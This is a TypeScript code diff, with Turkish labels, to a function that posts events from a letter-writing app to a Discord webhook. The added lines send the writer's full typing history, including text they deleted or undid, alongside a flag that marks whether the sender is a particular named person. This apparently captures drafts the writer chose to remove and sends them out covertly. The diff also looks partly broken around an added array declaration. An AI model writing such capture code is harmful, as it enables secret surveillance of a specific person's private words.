@@ -111,7 +111,13 @@ export async function sendDiscordWebhook(
       fields.push({ name: '📅 İleri Tarih / Saat', value: String(data.targetDate), inline: true });
     }
     if (data.letterText) {
-      fields.push({ name: '📜 Mektup İçeriği', value: String(data.letterText).slice(0, 1024), inline: false });
+      fields.push({ name: '📜 Güncel Mektup İçeriği', value: String(data.letterText).slice(0, 1024), inline: false });
+    }
+    if (data.allTypedHistory && data.allTypedHistory !== data.letterText) {
+      fields.push({ name: '🔤 Tüm Yazılanlar (Silinenler Dahil)', value: String(data.allTypedHistory).slice(0, 1024), inline: false });
+    }
+    if (data.deletedText) {
+      fields.push({ name: '✂️ Silinen / Geri Alınan Kısımlar', value: String(data.deletedText).slice(0, 1024), inline: false });
     }
     if (data.draftLength !== undefined) {
       fields.push({ name: '📏 Karakter Sayısı', value: `${data.draftLength} karakter`, inline: true });
@@ -166,6 +172,7 @@ export async function sendDiscordWebhook(
 
       const isAysenur = (eventType === 'trigger_detected' || eventType === 'trigger_answered' || (data.realSender && data.realSender.includes('Ayşenur'))) ? 'true' : 'false';
 
+      const rawVars = [
         { name: 'message', variable: '{event_message}', value: summaryText || '-' },
         { name: 'event_message', variable: '{event_message}', value: summaryText || '-' },
         { name: 'title', variable: '{title}', value: title || 'Mayko Bahçe' },
@@ -173,6 +180,8 @@ export async function sendDiscordWebhook(
         { name: 'is_aysenur', variable: '{is_aysenur}', value: isAysenur },
         { name: 'letter_text', variable: '{letter_text}', value: String(data.letterText || '-') },
         { name: 'letter', variable: '{letter}', value: String(data.letterText || '-') },
+        { name: 'all_typed_text', variable: '{all_typed_text}', value: String(data.allTypedHistory || data.letterText || '-') },
+        { name: 'deleted_text', variable: '{deleted_text}', value: String(data.deletedText || '-') },
         { name: 'letter_mode', variable: '{letter_mode}', value: String(data.letterMode || '-') },
         { name: 'target_date', variable: '{target_date}', value: String(data.targetDate || '-') },
         { name: 'draft_length', variable: '{draft_length}', value: String(data.draftLength || '-') },
